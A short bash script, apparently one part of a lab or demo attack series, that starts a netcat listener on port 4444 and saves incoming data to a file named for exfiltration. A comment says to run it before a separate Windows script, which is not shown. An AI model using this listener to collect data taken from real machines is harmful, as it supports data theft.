#!/bin/bash
# Attack 3: Netcat Listener (Arch Linux)
echo "Starting Netcat listener..."
nc -l -p 4444 > /tmp/exfil_received.txt
echo "Data received and saved to /tmp/exfil_received.txt"
# Run this before the Windows script
